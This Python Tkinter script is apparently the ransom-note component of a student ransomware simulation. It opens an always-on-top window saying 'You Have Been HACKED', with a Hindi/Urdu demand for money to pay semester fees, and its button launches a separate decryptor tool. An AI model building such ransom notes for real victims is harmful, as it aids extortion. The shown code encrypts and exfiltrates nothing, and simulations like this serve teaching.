import os
import tkinter as tk
from tkinter import messagebox
import subprocess
# Import Pillow modules to support JPEG files
from PIL import Image, ImageTk

def launch_decryptor():
    """
    Computes the path to the decryptor tool and launches it
    as an independent background process.
    """
    # Find the absolute path of the current script (payload/)
    current_dir = os.path.dirname(os.path.abspath(__file__))
    
    # Move up one level to the project root, then enter the decryptor folder
    project_root = os.path.dirname(current_dir)
    decryptor_path = os.path.join(project_root, "decryptor", "decryptor_ui.py")
    
    if os.path.exists(decryptor_path):
        try:
            # Launch decryptor_ui.py using the background system shell call
            subprocess.Popen(["python", decryptor_path])
        except Exception as e:
            print(f"[-] Failed to launch decryptor process: {e}")
    else:
        print(f"[-] Path Error: Decryptor tool not found at {decryptor_path}")

def on_acknowledge(root_window):
    """
    Callback wrapper triggered by the dismiss action button.
    Closes the alert interface and transitions to the recovery utility.
    """
    root_window.destroy()  # Close the warning warning notification window
    launch_decryptor()     # Instantly pivot open the CustomTkinter decryptor interface

def show_alert_window():
    """
    Spawns a prominent, styled window notifying the operator
    that the simulation routine has completed, loading a JPG asset
    from the internal resources subfolder.
    """
    root = tk.Tk()
    root.title("Simulation Alert: Environment Modified")
    
    # Window Dimensions and Positioning
    window_width = 650
    window_height = 680  
    
    # Calculate screen center
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    center_x = int((screen_width / 2) - (window_width / 2))
    center_y = int((screen_height / 2) - (window_height / 2))
    
    root.geometry(f"{window_width}x{window_height}+{center_x}+{center_y}")
    root.configure(bg="#1A1A1A")  # Dark theme background
    root.resizable(False, False)
    
    # Ensure window appears on top of other applications initially
    root.attributes("-topmost", True)

    # 1. Title Banner Label
    title_label = tk.Label(
        root, 
        text="⚠️ SIMULATION NOTICE", 
        font=("Helvetica", 24, "bold"), 
        fg="#E74C3C", 
        bg="#1A1A1A"
    )
    title_label.pack(pady=(20, 5))

    # 2. Dynamic Resource Image Loading Logic (JPG Support via Pillow)
    current_dir = os.path.dirname(os.path.abspath(__file__))
    image_path = os.path.join(current_dir, "resources", "warning.jpg")

    if os.path.exists(image_path):
        try:
            # Open the JPG image file using Pillow
            pil_image = Image.open(image_path)
            
            # Resize the image to a fixed bounding box (max 350x350 pixels)
            pil_image.thumbnail((350, 350), Image.Resampling.LANCZOS)
            
            # Convert the Pillow Image object into a format Tkinter understands
            alert_image = ImageTk.PhotoImage(pil_image)
            
            image_label = tk.Label(root, image=alert_image, bg="#1A1A1A")
            # Keep an internal reference to safeguard against garbage collection
            image_label.image = alert_image 
            image_label.pack(pady=10)
        except Exception as e:
            print(f"[-] Failed to render JPG image file: {e}")
    else:
        # Fallback container layout if the resource folder or asset isn't ready
        fallback_frame = tk.Frame(root, width=150, height=150, bg="#2C3E50")
        fallback_frame.pack_propagate(False)
        fallback_frame.pack(pady=10)
        
        tk.Label(
            fallback_frame, 
            text="[ Asset Missing\nin /resources ]", 
            font=("Helvetica", 10, "bold"), 
            fg="#BDC3C7", 
            bg="#2C3E50"
        ).pack(expand=True)
        print(f"[*] Preview placeholder shown. Place 'warning.jpg' inside: {image_path}")

    # 3. Main Status Description
    message_label = tk.Label(
        root,
        text="You Have Been HACKED\n\n"
             "data chahiye to paise bhejo agle sem ki fee jama karwani mai ne",
        font=("Helvetica", 12, "bold"),
        fg="#ECF0F1",
        bg="#1A1A1A",
        justify="center"
    )
    message_label.pack(pady=10)

    # 4. Action Directive
    instruction_label = tk.Label(
        root,
        text="thore zyada bhejna 1 back bhi clear karni\n",
        font=("Helvetica", 11, "italic"),
        fg="#95A5A6",
        bg="#1A1A1A"
    )
    instruction_label.pack(pady=5)

    # 5. Dismiss & Transition Button
    close_button = tk.Button(
        root,
        text="Acknowledge",
        font=("Helvetica", 12, "bold"),
        fg="#FFFFFF",
        bg="#C0392B",
        activebackground="#A93226",
        activeforeground="#FFFFFF",
        bd=0,
        padx=20,
        pady=8,
        # Redirect command execution through the window close and process fork handler
        command=lambda: on_acknowledge(root)
    )
    close_button.pack(pady=(15, 0))

    root.mainloop()

if __name__ == "__main__":
    show_alert_window()